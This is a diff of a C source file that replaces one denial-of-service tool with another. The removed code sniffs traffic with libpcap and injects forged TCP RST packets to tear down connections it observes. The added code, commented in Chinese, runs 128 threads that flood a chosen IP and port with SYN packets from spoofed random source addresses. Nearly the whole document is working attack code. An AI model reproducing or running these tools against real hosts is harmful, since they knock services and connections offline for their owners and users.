@@ -1,276 +1,280 @@
-/* Simple TCP SYN Denial Of Service                                      */
-/* Author: Luis Martin Garcia. luis.martingarcia [.at.] gmail [d0t] com  */
-/* To compile: gcc tcpsyndos.c -o tcpsyndos -lpcap                       */
-/* Run as root!                                                          */
-/*                                                                       */
-/* This code is distributed under the GPL License. For more info check:  */
-/* http://www.gnu.org/copyleft/gpl.html                                  */
+#include <stdio.h>
+#include <ctype.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <string.h>
+#include <netdb.h>
+#include <errno.h>
+#include <stdlib.h>
+#include <time.h> 
+#include <arpa/inet.h>
 
+/* 最多线程数 */
+#define MAXCHILD 128
 
-#define __USE_BSD         /* Using BSD IP header           */ 
-#include <netinet/ip.h>   /* Internet Protocol             */ 
-#define __FAVOR_BSD       /* Using BSD TCP header          */ 
-#include <netinet/tcp.h>  /* Transmission Control Protocol */ 
-#include <pcap.h>         /* Libpcap                       */ 
-#include <string.h>       /* String operations             */ 
-#include <stdlib.h>       /* Standard library definitions  */ 
+/* 原始套接字 */
+int sockfd;
 
-#define TCPSYN_LEN 20
-#define MAXBYTES2CAPTURE 2048
+/* 程序活动标志 */
+static int alive = -1;
 
-/* Pseudoheader (Used to compute TCP checksum. Check RFC 793) */
-typedef struct pseudoheader {
-    u_int32_t src;
-    u_int32_t dst;
-    u_char zero;
-    u_char protocol;
-    u_int16_t tcplen;
-} tcp_phdr_t;
+char dst_ip[20] = { 0 };
+int dst_port;
 
-typedef unsigned short u_int16;
-typedef unsigned long u_int32;
-
-
-/* Function Prototypes */
-int TCP_RST_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_int16 dst_prt);
-unsigned short in_cksum(unsigned short *addr,int len);
-
-/* main(): Main function. Opens network interface for capture. Tells the kernel*/
-/* to deliver packets with the ACK or PSH-ACK flags set. Prints information    */
-/* about captured packets. Calls TCP_RST_send() to kill the TCP connection     */
-/* using TCP RST packets.                                                      */
-int main(int argc, char *argv[] ){
- 
-    int count=0;
-    bpf_u_int32 netaddr=0, mask=0;    /* To Store network address and netmask   */ 
-    struct bpf_program filter;        /* Place to store the BPF filter program  */ 
-    char errbuf[PCAP_ERRBUF_SIZE];    /* Error buffer                           */ 
-    pcap_t *descr = NULL;             /* Network interface handler              */ 
-    struct pcap_pkthdr pkthdr;        /* Packet information (timestamp,size...) */ 
-    const unsigned char *packet=NULL; /* Received raw data                      */ 
-    struct ip *iphdr = NULL;          /* IPv4 Header                            */
-    struct tcphdr *tcphdr = NULL;     /* TCP Header                             */
-    memset(errbuf,0,PCAP_ERRBUF_SIZE);
-
-   
-if (argc != 2){
-    fprintf(stderr, "USAGE: tcpsyndos <interface>\n");
-    exit(1);
-}
-
- /* Open network device for packet capture */ 
- descr = pcap_open_live(argv[1], MAXBYTES2CAPTURE, 1,  512, errbuf);
- if(descr==NULL){
-   fprintf(stderr, "pcap_open_live(): %s \n", errbuf);
-   exit(1);
- }
-
- /* Look up info from the capture device. */ 
- if ( pcap_lookupnet( argv[1] , &netaddr, &mask, errbuf) == -1 ){ 
-   fprintf(stderr, "ERROR: pcap_lookupnet(): %s\n", errbuf );
-   exit(1);
- }
-
- /* Compiles the filter expression into a BPF filter program */
- if ( pcap_compile(descr, &filter, "(tcp[13] == 0x10) or (tcp[13] == 0x18)", 1, mask) == -1){
-    fprintf(stderr, "Error in pcap_compile(): %s\n", pcap_geterr(descr) );
-    exit(1);
- }
- 
- /* Load the filter program into the packet capture device. */ 
- if( pcap_setfilter(descr,&filter) == -1 ){
-    fprintf(stderr, "Error in pcap_setfilter(): %s\n", pcap_geterr(descr));
-    exit(1);
- }
-
-
-
-while(1){ 
- /* Get one packet */
- if ( (packet = pcap_next(descr,&pkthdr)) == NULL){
-   fprintf(stderr, "Error in pcap_next()\n", errbuf);
-   exit(1);
- }
-
- iphdr = (struct ip *)(packet+14);
- tcphdr = (struct tcphdr *)(packet+14+20);
- if(count==0)printf("+-------------------------+\n");
- printf("Received Packet No.%d:\n", ++count);
- printf("   ACK: %u\n", ntohl(tcphdr->th_ack) ); 
- printf("   SEQ: %u\n", ntohl(tcphdr->th_seq) );
- printf("   DST IP: %s\n", inet_ntoa(iphdr->ip_dst)); 
- printf("   SRC IP: %s\n", inet_ntoa(iphdr->ip_src)); 
- printf("   SRC PORT: %d\n", ntohs(tcphdr->th_sport) ); 
- printf("   DST PORT: %d\n", ntohs(tcphdr->th_dport) ); 
-
- TCP_RST_send(tcphdr->th_ack, iphdr->ip_dst.s_addr, iphdr->ip_src.s_addr, tcphdr->th_dport, tcphdr->th_sport);
- TCP_RST_send(htonl(ntohl(tcphdr->th_seq)+1), iphdr->ip_src.s_addr, iphdr->ip_dst.s_addr, tcphdr->th_sport, tcphdr->th_dport);
-
- printf("+-------------------------+\n");
-
-}
-
- 
-
-return 0;
-
-}
-
-
-
-/* TCP_RST_send(): Crafts a TCP packet with the RST flag set using the supplied */
-/* values and sends the packet through a raw socket.                            */
-int TCP_RST_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_int16 dst_prt){
-
-  static int i=0;
-  int one=1; /* R.Stevens says we need this variable for the setsockopt call */ 
-
-  /* Raw socket file descriptor */ 
-  int rawsocket=0;  
+struct ip{
+  unsigned char       hl;
+  unsigned char       tos;
+  unsigned short      total_len;
+  unsigned short      id;
+  unsigned short      frag_and_flags;
+  unsigned char       ttl;
+  unsigned char       proto;
+  unsigned short      checksum;
+  unsigned int        sourceIP;
+  unsigned int        destIP;
+};
   
-  /* Buffer for the TCP/IP SYN Packets */
-  char packet[ sizeof(struct tcphdr) + sizeof(struct ip) +1 ];   
+struct tcphdr{
+  unsigned short      sport;
+  unsigned short      dport;
+  unsigned int        seq;
+  unsigned int        ack;
+  unsigned char       lenres;
+  unsigned char       flag;
+  unsigned short      win;
+  unsigned short      sum;
+  unsigned short      urp;
+};
 
-  /* It will point to start of the packet buffer */  
-  struct ip *ipheader = (struct ip *)packet;   
+struct pseudohdr
+{
+  unsigned int      saddr;
+  unsigned int      daddr;
+  char                zero;
+  char                protocol;
+  unsigned short      length;
+};
+
+/* CRC16校验 */
+unsigned short
+checksum (unsigned short *buffer, unsigned short size)     
+{  
+
+  unsigned long cksum = 0;
   
-  /* It will point to the end of the IP header in packet buffer */  
-  struct tcphdr *tcpheader = (struct tcphdr *) (packet + sizeof(struct ip)); 
-  
-  /* TPC Pseudoheader (used in checksum)    */
-  tcp_phdr_t pseudohdr;            
-
-  /* TCP Pseudoheader + TCP actual header used for computing the checksum */
-  char tcpcsumblock[ sizeof(tcp_phdr_t) + TCPSYN_LEN ];
-
-  /* Although we are creating our own IP packet with the destination address */
-  /* on it, the sendto() system call requires the sockaddr_in structure */
-  struct sockaddr_in dstaddr;  
-  
-  memset(&pseudohdr,0,sizeof(tcp_phdr_t));
-  memset(&packet, 0, sizeof(packet));
-  memset(&dstaddr, 0, sizeof(dstaddr));   
-    
-  dstaddr.sin_family = AF_INET;     /* Address family: Internet protocols */
-  dstaddr.sin_port = dst_prt;      /* Leave it empty */
-  dstaddr.sin_addr.s_addr = dst_ip; /* Destination IP */
-
-
-
-  /* Get a raw socket to send TCP packets */   
- if ( (rawsocket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0){
-        perror("TCP_RST_send():socket()"); 
-        exit(1);
+  while(size>1){
+    cksum += *buffer++;
+    size  -= sizeof(unsigned short);
   }
   
-  /* We need to tell the kernel that we'll be adding our own IP header */
-  /* Otherwise the kernel will create its own. The ugly "one" variable */
-  /* is a bit obscure but R.Stevens says we have to do it this way ;-) */
-  if( setsockopt(rawsocket, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0){
-        perror("TCP_RST_send():setsockopt()"); 
-        exit(1);
-   }
- 
-    
-  /* IP Header */
-  ipheader->ip_hl = 5;     /* Header lenght in octects                       */
-  ipheader->ip_v = 4;      /* Ip protocol version (IPv4)                     */
-  ipheader->ip_tos = 0;    /* Type of Service (Usually zero)                 */
-  ipheader->ip_len = htons( sizeof (struct ip) + sizeof (struct tcphdr) );         
-  ipheader->ip_off = 0;    /* Fragment offset. We'll not use this            */
-  ipheader->ip_ttl = 64;   /* Time to live: 64 in Linux, 128 in Windows...   */
-  ipheader->ip_p = 6;      /* Transport layer prot. TCP=6, UDP=17, ICMP=1... */
-  ipheader->ip_sum = 0;    /* Checksum. It has to be zero for the moment     */
-  ipheader->ip_id = htons( 1337 ); 
-  ipheader->ip_src.s_addr = src_ip;  /* Source IP address                    */
-  ipheader->ip_dst.s_addr = dst_ip;  /* Destination IP address               */
-
-  /* TCP Header */   
-  tcpheader->th_seq = seq;        /* Sequence Number                         */
-  tcpheader->th_ack = htonl(1);   /* Acknowledgement Number                  */
-  tcpheader->th_x2 = 0;           /* Variable in 4 byte blocks. (Deprecated) */
-  tcpheader->th_off = 5;          /* Segment offset (Lenght of the header)   */
-  tcpheader->th_flags = TH_RST;   /* TCP Flags. We set the Reset Flag        */
-  tcpheader->th_win = htons(4500) + rand()%1000;/* Window size               */
-  tcpheader->th_urp = 0;          /* Urgent pointer.                         */
-  tcpheader->th_sport = src_prt;  /* Source Port                             */
-  tcpheader->th_dport = dst_prt;  /* Destination Port                        */
-  tcpheader->th_sum=0;            /* Checksum. (Zero until computed)         */
+  if(size){
+    cksum += *(unsigned char *)buffer;
+  }
   
-  /* Fill the pseudoheader so we can compute the TCP checksum*/
-  pseudohdr.src = ipheader->ip_src.s_addr;
-  pseudohdr.dst = ipheader->ip_dst.s_addr;
-  pseudohdr.zero = 0;
-  pseudohdr.protocol = ipheader->ip_p;
-  pseudohdr.tcplen = htons( sizeof(struct tcphdr) );
+  cksum = (cksum >> 16) + (cksum & 0xffff);
+  cksum += (cksum >> 16);   
+  
+  return((unsigned short )(~cksum));
+}
 
-  /* Copy header and pseudoheader to a buffer to compute the checksum */  
-  memcpy(tcpcsumblock, &pseudohdr, sizeof(tcp_phdr_t));   
-  memcpy(tcpcsumblock+sizeof(tcp_phdr_t),tcpheader, sizeof(struct tcphdr));
-    
-  /* Compute the TCP checksum as the standard says (RFC 793) */
-  tcpheader->th_sum = in_cksum((unsigned short *)(tcpcsumblock), sizeof(tcpcsumblock)); 
+/* 发送SYN包函数
+ * 填写IP头部，TCP头部
+ * TCP伪头部仅用于校验和的计算
+ */
+void
+init_header(struct ip *ip, struct tcphdr *tcp, struct pseudohdr *pseudoheader)
+{
+  int len = sizeof(struct ip) + sizeof(struct tcphdr);
+  // IP头部数据初始化
+  ip->hl = (4<<4 | sizeof(struct ip)/sizeof(unsigned int));
+  ip->tos = 0;
+  ip->total_len = htons(len);
+  ip->id = 1;
+  ip->frag_and_flags = 0x40;
+  ip->ttl = 255;
+  ip->proto = IPPROTO_TCP;
+  ip->checksum = 0;
+  ip->sourceIP = 0;
+  ip->destIP = inet_addr(dst_ip);
 
-  /* Compute the IP checksum as the standard says (RFC 791) */
-  ipheader->ip_sum = in_cksum((unsigned short *)ipheader, sizeof(struct ip));
-    
-  /* Send it through the raw socket */    
-  if ( sendto(rawsocket, packet, ntohs(ipheader->ip_len), 0,
-                  (struct sockaddr *) &dstaddr, sizeof (dstaddr)) < 0){     
-        return -1;                     
+  // TCP头部数据初始化
+  tcp->sport = htons( rand()%16383 + 49152 );
+  tcp->dport = htons(dst_port);
+  tcp->seq = htonl( rand()%90000000 + 2345 ); 
+  tcp->ack = 0; 
+  tcp->lenres = (sizeof(struct tcphdr)/4<<4|0);
+  tcp->flag = 0x02;
+  tcp->win = htons (2048);  
+  tcp->sum = 0;
+  tcp->urp = 0;
+
+  //TCP伪头部
+  pseudoheader->zero = 0;
+  pseudoheader->protocol = IPPROTO_TCP;
+  pseudoheader->length = htons(sizeof(struct tcphdr));
+  pseudoheader->daddr = inet_addr(dst_ip);
+  srand((unsigned) time(NULL));
+
+}
+
+
+/* 发送SYN包函数
+ * 填写IP头部，TCP头部
+ * TCP伪头部仅用于校验和的计算
+ */
+void
+send_synflood(struct sockaddr_in *addr)
+{ 
+  char buf[100], sendbuf[100];
+  int len;
+  struct ip ip;     //IP头部
+  struct tcphdr tcp;    //TCP头部
+  struct pseudohdr pseudoheader;  //TCP伪头部
+
+
+  len = sizeof(struct ip) + sizeof(struct tcphdr);
+  
+  /* 初始化头部信息 */
+  init_header(&ip, &tcp, &pseudoheader);
+  
+  /* 处于活动状态时持续发送SYN包 */
+  while(alive)
+  {
+    ip.sourceIP = rand();
+
+    //计算IP校验和
+    bzero(buf, sizeof(buf));
+    memcpy(buf , &ip, sizeof(struct ip));
+    ip.checksum = checksum((u_short *) buf, sizeof(struct ip));
+
+    pseudoheader.saddr = ip.sourceIP;
+
+    //计算TCP校验和
+    bzero(buf, sizeof(buf));
+    memcpy(buf , &pseudoheader, sizeof(pseudoheader));
+    memcpy(buf+sizeof(pseudoheader), &tcp, sizeof(struct tcphdr));
+    tcp.sum = checksum((u_short *) buf, sizeof(pseudoheader)+sizeof(struct tcphdr));
+
+    bzero(sendbuf, sizeof(sendbuf));
+    memcpy(sendbuf, &ip, sizeof(struct ip));
+    memcpy(sendbuf+sizeof(struct ip), &tcp, sizeof(struct tcphdr));
+    printf(".");
+    if (
+      sendto(sockfd, sendbuf, len, 0, (struct sockaddr *) addr, sizeof(struct sockaddr))
+      < 0)
+    {
+      perror("sendto()");
+      pthread_exit("fail");
     }
-
-  printf("Sent RST Packet:\n");
-  printf("   SRC: %s:%d\n", inet_ntoa(ipheader->ip_src), ntohs(tcpheader->th_sport));
-  printf("   DST: %s:%d\n", inet_ntoa(ipheader->ip_dst), ntohs(tcpheader->th_dport));
-  printf("   Seq=%u\n", ntohl(tcpheader->th_seq));
-  printf("   Ack=%d\n", ntohl(tcpheader->th_ack));
-  printf("   TCPsum: %02x\n",  tcpheader->th_sum);
-  printf("   IPsum: %02x\n", ipheader->ip_sum);
-    
-  close(rawsocket);
-
-return 0;
-  
-  
-} /* End of IP_Id_send() */
-
-
-
-
-/* This piece of code has been used many times in a lot of differents tools. */
-/* I haven't been able to determine the author of the code but it looks like */
-/* this is a public domain implementation of the checksum algorithm */
-unsigned short in_cksum(unsigned short *addr,int len){
-    
-register int sum = 0;
-u_short answer = 0;
-register u_short *w = addr;
-register int nleft = len;
-    
-/*
-* Our algorithm is simple, using a 32-bit accumulator (sum),
-* we add sequential 16-bit words to it, and at the end, fold back 
-* all the carry bits from the top 16 bits into the lower 16 bits. 
-*/
-    
-while (nleft > 1) {
-sum += *w++;
-nleft -= 2;
+    //sleep(1);
+  }
 }
 
-/* mop up an odd byte, if necessary */
-if (nleft == 1) {
-*(u_char *)(&answer) = *(u_char *)w ;
-sum += answer;
+/* 信号处理函数,设置退出变量alive */
+void 
+sig_int(int signo)
+{
+  alive = 0;
 }
 
-/* add back carry outs from top 16 bits to low 16 bits */
-sum = (sum >> 16) + (sum &0xffff); /* add hi 16 to low 16 */
-sum += (sum >> 16); /* add carry */
-answer = ~sum; /* truncate to 16 bits */
-return(answer);
+/* 主函数 */
+int 
+main(int argc, char *argv[])
+{
+  struct sockaddr_in addr;
+  struct hostent * host = NULL;
 
-} /* End of in_cksum() */
+  int on = 1;
+  int i = 0;
+  pthread_t pthread[MAXCHILD];
+  int err = -1;
 
-/* EOF */
+  alive = 1;
+  /* 截取信号CTRL+C */
+  signal(SIGINT, sig_int);
+
+  /* 参数是否数量正确 */
+  if(argc < 3)
+  {
+    printf("usage: syn <IPaddress> <Port>\n");
+    exit(1);
+  }
+
+  strncpy( dst_ip, argv[1], 16 );
+  dst_port = atoi( argv[2] );
+
+  bzero(&addr, sizeof(addr));
+
+  addr.sin_family = AF_INET;
+  addr.sin_port = htons(dst_port);
+
+  if(inet_addr(dst_ip) == INADDR_NONE)
+  {
+    /* 为DNS地址，查询并转换成IP地址 */
+    host = gethostbyname(argv[1]);
+    if(host == NULL)
+    {
+      perror("gethostbyname()");
+      exit(1);
+    }
+    addr.sin_addr = *((struct in_addr*)(host->h_addr));
+    strncpy( dst_ip, inet_ntoa(addr.sin_addr), 16 );
+  }
+  else
+    addr.sin_addr.s_addr = inet_addr(dst_ip);
+
+  if( dst_port < 0 || dst_port > 65535 )
+  {
+    printf("Port Error\n");
+    exit(1);
+  }
+
+  printf("host ip=%s\n", inet_ntoa(addr.sin_addr));
+
+  /* 建立原始socket */
+  sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_TCP); 
+  if (sockfd < 0)    
+  {
+    perror("socket()");
+    exit(1);
+  }
+  /* 设置IP选项 */
+  if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof (on)) < 0)
+  {
+    perror("setsockopt()");
+    exit(1);
+  }
+
+  /* 将程序的权限修改为普通用户 */
+  setuid(getpid());
+
+  /* 建立多个线程协同工作 */
+  for(i=0; i<MAXCHILD; i++)
+  {
+    err = pthread_create(&pthread[i], NULL, send_synflood, &addr);
+    if(err != 0)
+    {
+      perror("pthread_create()");
+      exit(1);
+    }
+  }
+
+  /* 等待线程结束 */
+  for(i=0; i<MAXCHILD; i++)
+  {
+    err = pthread_join(pthread[i], NULL);
+    if(err != 0)
+    {
+      perror("pthread_join Error\n");
+      exit(1);
+    }
+  }
+
+  close(sockfd);
+
+  return 0;
+}
